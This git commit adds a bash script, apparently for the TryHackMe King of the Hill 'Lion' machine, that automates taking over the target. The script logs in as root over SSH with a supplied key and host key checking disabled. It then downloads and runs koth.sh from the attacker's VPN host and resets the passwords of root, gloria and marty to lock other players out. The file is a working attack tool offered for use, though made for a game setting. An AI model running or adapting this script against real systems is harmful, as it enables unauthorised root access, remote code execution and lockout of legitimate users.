9964bf3d4434b5774f8d0e60f551dc3321b085c2
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-07-01 13:44:11 +0100

    Add files via upload

---
+++ Lion/Lion.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+set -x
+
+read -p "Enter SSH IP address: " ip_address
+read -p "Enter the id_rsa path: " id_rsa_path
+read -p "What is your TryHackMe username: " nick
+read -p "Enter the new password: " password
+
+vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
+
+ssh -o StrictHostKeychecking=no -i "$id_rsa_path" -p 1337 root@"$ip_address" << EOF
+
+cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
+echo "root:$password" | chpasswd
+echo "gloria:$password" | chpasswd
+echo "marty:$password" | chpasswd
+
+EOF
